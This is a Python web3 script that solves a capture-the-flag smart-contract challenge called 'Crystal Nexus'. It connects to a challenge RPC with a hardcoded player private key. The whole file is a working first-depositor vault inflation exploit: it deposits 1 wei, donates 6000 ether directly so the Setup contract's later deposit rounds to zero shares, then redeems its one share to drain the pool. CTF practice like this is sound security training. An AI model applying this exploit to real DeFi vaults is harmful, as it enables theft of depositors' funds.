from web3 import Web3

# Configuration
RPC = "http://challenges.1pc.tf:39571/63281a36-10b5-4854-b8bd-a9a364e64640"
PRIVKEY = "46e0f164ac0513c9dd25f560e2d74e203f8d08abcba30c227d5de66c2b00384c"
SETUP = "0xD6a6d1331Ed20102dA3188f03977d0EbeFc09083"
WALLET = "0x3C00a9F6953CE48Cb11f8442d5b00ce2733556d1"

# ABIs
SETUP_ABI = [
    {"inputs": [], "name": "essence", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "nexus", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "conductRituals", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "isSolved", "outputs": [{"type": "bool"}], "stateMutability": "view", "type": "function"},
]

ESSENCE_ABI = [
    {"inputs": [{"name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"},
    {"inputs": [{"name": "spender", "type": "address"}, {"name": "amount", "type": "uint256"}], "name": "approve", "outputs": [{"type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "to", "type": "address"}, {"name": "amount", "type": "uint256"}], "name": "transfer", "outputs": [{"type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
]

NEXUS_ABI = [
    {"inputs": [{"name": "essenceAmount", "type": "uint256"}], "name": "attune", "outputs": [{"type": "uint256"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "crystalAmount", "type": "uint256"}, {"name": "recipient", "type": "address"}], "name": "dissolve", "outputs": [{"type": "uint256"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "addr", "type": "address"}], "name": "crystalBalance", "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "totalCrystals", "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "amplitude", "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"},
]

def send_tx(w3, account, contract, function_name, *args):
    """Helper to send transaction"""
    nonce = w3.eth.get_transaction_count(account.address)
    
    # Build transaction
    tx = contract.functions[function_name](*args).build_transaction({
        'from': account.address,
        'nonce': nonce,
        'gas': 500000,
        'gasPrice': w3.eth.gas_price
    })
    
    # Sign and send
    signed = account.sign_transaction(tx)
    raw_tx = signed.rawTransaction if hasattr(signed, 'rawTransaction') else signed.raw_transaction
    tx_hash = w3.eth.send_raw_transaction(raw_tx)
    
    # Wait for receipt
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return receipt

def main():
    print("="*70)
    print("CRYSTAL NEXUS - VAULT INFLATION ATTACK")
    print("="*70)
    print()
    
    # Connect
    w3 = Web3(Web3.HTTPProvider(RPC))
    if not w3.is_connected():
        print("❌ Connection failed")
        return
    
    print("✅ Connected to blockchain")
    
    # Setup account
    account = w3.eth.account.from_key(PRIVKEY)
    
    # Load contracts
    setup = w3.eth.contract(address=Web3.to_checksum_address(SETUP), abi=SETUP_ABI)
    
    essence_addr = setup.functions.essence().call()
    nexus_addr = setup.functions.nexus().call()
    
    essence = w3.eth.contract(address=essence_addr, abi=ESSENCE_ABI)
    nexus = w3.eth.contract(address=nexus_addr, abi=NEXUS_ABI)
    
    print(f"Essence: {essence_addr}")
    print(f"Nexus:   {nexus_addr}")
    print()
    
    # Check initial balance
    initial_balance = essence.functions.balanceOf(WALLET).call()
    print(f"[*] Initial player essence: {w3.from_wei(initial_balance, 'ether')} ether")
    print()
    
    # Step 1: Approve nexus
    print("[*] Step 1: Approving nexus to spend essence...")
    send_tx(w3, account, essence, 'approve', nexus_addr, 2**256 - 1)
    print("✅ Approved")
    print()
    
    # Step 2: Attune 1 wei (first depositor gets 1:1 rate)
    print("[*] Step 2: Attuning 1 wei...")
    send_tx(w3, account, nexus, 'attune', 1)
    print("✅ Attuned")
    
    player_crystals = nexus.functions.crystalBalance(WALLET).call()
    total_crystals = nexus.functions.totalCrystals().call()
    print(f"    Player crystals: {player_crystals}")
    print(f"    Total crystals: {total_crystals}")
    print()
    
    # Step 3: Transfer 6000 ether directly to nexus (inflate exchange rate)
    print("[*] Step 3: Donating 6000 ether directly to nexus...")
    donation = w3.to_wei(6000, 'ether')
    send_tx(w3, account, essence, 'transfer', nexus_addr, donation)
    print("✅ Donated")
    
    amplitude = nexus.functions.amplitude().call()
    print(f"    Amplitude: {w3.from_wei(amplitude, 'ether')} ether")
    print()
    
    # Step 4: Call conductRituals (Setup attunes but gets 0 crystals due to rounding)
    print("[*] Step 4: Calling conductRituals...")
    send_tx(w3, account, setup, 'conductRituals')
    print("✅ Rituals complete")
    
    total_crystals_after = nexus.functions.totalCrystals().call()
    print(f"    Total crystals: {total_crystals_after}")
    print()
    
    # Step 5: Dissolve our 1 crystal
    print("[*] Step 5: Dissolving 1 crystal...")
    send_tx(w3, account, nexus, 'dissolve', 1, WALLET)
    print("✅ Dissolved")
    print()
    
    # Check results
    print("="*70)
    print("RESULT")
    print("="*70)
    
    final_balance = essence.functions.balanceOf(WALLET).call()
    is_solved = setup.functions.isSolved().call()
    
    print(f"Final balance: {w3.from_wei(final_balance, 'ether')} ether")
    print(f"Is solved: {is_solved}")
    print()
    
    if is_solved:
        print("🎉🎉🎉 SUCCESS! GET THE FLAG! 🎉🎉🎉")
    else:
        print("❌ Not solved")
    
    print("="*70)

if __name__ == "__main__":
    main()




